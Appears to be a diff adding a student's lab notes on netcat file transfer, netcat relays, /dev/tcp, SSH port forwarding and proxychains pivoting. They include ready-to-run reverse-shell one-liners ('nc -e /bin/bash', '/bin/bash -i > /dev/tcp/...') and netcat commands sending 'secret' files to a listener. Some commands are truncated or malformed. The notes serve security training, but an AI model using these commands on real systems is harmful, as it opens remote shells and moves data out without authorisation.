@@ -767,3 +767,222 @@ ssh student@10.50.47.43 ls -l /home/student/joke
 ssh student@10.50.47.43 cat /home/student/joke
 touch kirwa.txt
 scp kirwa.txt student@10.50.47.43:/home/student/joke
+
+
+We can use cat and netcat to send files back and fort. 
+scp student@172.
+
+nc 19.168.241.213 33502 < wilkinson.txt # 
+
+nc -nlvp 2211 > stolen_bin # This is on the other side... output your list into a new file 
+
+
+
+## FILE TRANSFER AND REDIRECTION ##
+
+### NETCAT: CLIENT TO LISTENER FILE TRANSFER ###
+Listener (receive file):
+
+nc -lvp 9001 > newfile.txt
+Client (sends file):
+
+nc 172.16.82.106 9001 < file.txt
+
+### NETCAT: LISTENER TO CLIENT FILE TRANSFER ###
+Listener (sends file):
+
+nc -lvp 9001 < file.txt
+Client (receive file):
+
+nc 172.16.82.106 9001 > newfile.txt
+
+### NETCAT RELAY DEMOS ###
+Listener - Listener
+
+On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+On Internet_Host (send):
+
+$ nc 172.16.82.106 1111 < secret.txt
+On Blue_Priv_Host-1 (receive):
+
+$ nc 192.168.1.1 3333 > newsecret.txt
+
+Client - Listener
+
+On Internet_Host (send):
+$ nc -lvp 1111 < secret.txt
+
+On Blue_Priv_Host-1 (receive):
+$ nc 192.168.1.1 3333 > newsecret.txt
+
+On Blue_Host-1 Relay:
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
+
+Listener - Client
+
+On Internet_Host (send):
+
+$ nc -172.16.82.106 1111 < secret.txt
+On Blue_Priv_Host-1 (receive):
+
+$ nc -lvp 3333 > newsecret.txt
+On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+### FILE TRANSFER WITH /DEV/TCP ###
+On the receiving box:
+
+$ nc -lvp 1111 > devtcpfile.txt
+On the sending box:
+
+$ cat secret.txt > /dev/tcp/10.10.0.40/1111
+This method is useful for host that does not have NETCAT available.
+
+### REVERSE SHELL USING NETCAT ###
+
+First listen for the shell on your device.
+
+$ nc -lvp 9999
+On Victim using -c :
+
+$ nc -c /bin/bash 10.10.0.40 9999
+On Victim using -e :
+
+$ nc -e /bin/bash 10.10.0.40 9999
+
+### REVERSE SHELL USING /DEV/TCP ###
+First listen for the shell on your device.
+
+$ nc -lvp 9999
+On Victim:
+
+024a1256e6f2ac6f08d2ccca2c3ba2a1
+
+#### $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1 #### 
+
+## SSH TUNNELING AND COVERT CHANNELS ##
+
+### SECURE SHELL (SSH) ###
+
+Built on Client vs Server vs Session
+
+### SSH FIRST CONNECT ###
+
+student@internet-host:~$ ssh student@172.16.82.106
+The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
+ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
+student@172.16.82.106's password:
+student@blue-host-1:~$
+You will need to approve the Server Host (Public) Key
+
+Key is saved to /home/student/.ssh/known_hosts
+
+### SSH RE-CONNECT ###
+ssh student@172.16.82.106
+student@172.16.82.106's password:
+student@blue-host-1:~$
+Further SSH connections to server will not prompt to save key as long as key does not change
+
+### SSH HOST KEY CHANGED ### 
+ssh student@172.16.82.106
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the ECDSA key sent by the remote host is
+SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
+Please contact your system administrator.
+Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
+Offending ECDSA key in /home/student/.ssh/known_hosts:1
+remove with:
+ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
+ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
+Host key verification failed.
+
+### SSH KEY CHANGE FIX ###
+ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
+Copy/Paste the ssh-geygen message to remove the Host key from the known_hosts file
+
+### SSH LOCAL PORT FORWARDING ###
+
+Syntax
+ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+or
+ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
+
+ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22
+
+Connected to 20.1 but not touched .15.22 yet..this happens when 
+
+GATEWAY FORWARDING...
+
+ssh student@127.0.0.1 -> If I gotta get to 15:22 you gotta go through here.. 
+
+
+This command initiates an SSH (Secure Shell) connection to the remote host at IP address 172.16.20.1 with the username vyos. However, it also includes a port forwarding option (-L) that sets up a local port forwarding rule.
+
+Here's a breakdown of what each part of the command does:
+
+vyos@172.16.20.1: This specifies the SSH username (vyos) and the IP address of the remote host (172.16.20.1) to connect to.
+
+-L 127.0.0.1:2223:172.16.1.15:22: This is the port forwarding configuration. It consists of two parts separated by a colon:
+
+127.0.0.1:2223: This part specifies the local endpoint of the port forwarding. It means that on your local machine (127.0.0.1), port 2223 is being forwarded.
+
+172.16.1.15:22: This part specifies the remote endpoint of the port forwarding. It means that traffic received on your local machine's port 2223 will be forwarded to the remote machine at IP address 172.16.1.15 on port 22 (the default SSH port).
+
+So, what this command does is establish an SSH connection to 172.16.20.1 and sets up a local port forwarding rule where any traffic sent to your local machine on port 2223 will be forwarded to the remote machine at 172.16.1.15 on port 22. This can be useful for securely accessing services on the remote machine (172.16.1.15) as if they were running locally on your own machine, using port 2223 as the entry point.
+
+For example, after running this command, you can SSH into the remote machine as follows:
+
+bash
+Copy code
+ssh -p 2223 localhost
+This connects to your local port 2223, and the SSH traffic is forwarded to the remote machine, allowing you to log in as if you were directly SSHing into 172.16.1.15.
+
+ss -nltp
+
+ssh 
+
+ss -ant | grep ESTAB -> 
+
+
+
+
+
+
+#### BDY ####
+ssh -L 127.0.0.1:2222:172.16.1.15:22 vyos@172.16.20.1
+ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22  ##Same command as above, just using a different port and moving the user/password creds to a more logical place
+ss -natp | grep <port #> OR grep ESTAB to see if you are listening
+* double-click Terminator window to rename
+(From blue-int-dmz-host-1-student-#) 1. ssh student@127.0.0.1 -p 2223 -L 127.0.0.1:4444:172.16.40.10:22
+(From blue-internet-host-student-#) 2. ssh student@127.0.0.1 -p 4444
+
+## SSH DYNAMIC PORT FORWARDING ##
+
+ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
+Proxychains default port is 9050
+
+Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
+
+Allows the use of scripts and other userspace programs through the tunnel.
+
+
+ssh vyos@172.16.20.1 -D 9050 # You can use any port you can but by default proxy chain uses 9050
+
+proxychains nmap -Pn -sT 172.16.1.30/27 -p 21-23 80 # proxychain command that allows encapsulation
+
+
+ssh vyos@172.16 #Tunnel through a tunnel 
+
